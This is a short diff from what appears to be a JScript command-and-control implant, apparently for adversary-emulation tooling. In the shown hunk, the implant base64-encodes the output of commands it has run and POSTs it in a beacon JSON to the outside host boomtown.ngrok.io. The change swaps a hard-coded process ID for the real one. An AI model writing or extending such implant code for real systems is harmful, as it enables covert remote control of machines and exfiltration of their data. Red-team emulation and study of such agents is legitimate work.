@@ -72,7 +72,7 @@ try {
 	var p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
 	p.Open("POST","http://boomtown.ngrok.io",false);  // Just another way to send back results.
 	var so_b64 = Base64.encode(so); //base64 encode stdout.
-	var JSONResponse = '{"Name":"Boomer2","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["psh", "cmd"],"Range":"home","Pwd":"","Sleep":10,"Executing":"","Links":[{"ID":"'+id_task+'","Executor":"cmd","Payload":"","Request":"'+c+'","Response":"'+so_b64+'","Status":"0","operation": "'+operation+'","Pid":"9999"}]}';
+	var JSONResponse = '{"Name":"Boomer2","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["psh", "cmd"],"Range":"home","Pwd":"","Sleep":10,"Executing":"","Links":[{"ID":"'+id_task+'","Executor":"cmd","Payload":"","Request":"'+c+'","Response":"'+so_b64+'","Status":"0","operation": "'+operation+'","Pid":"'+r.ProcessID+'"}]}';
 	
 	p.Send(JSONResponse);
 
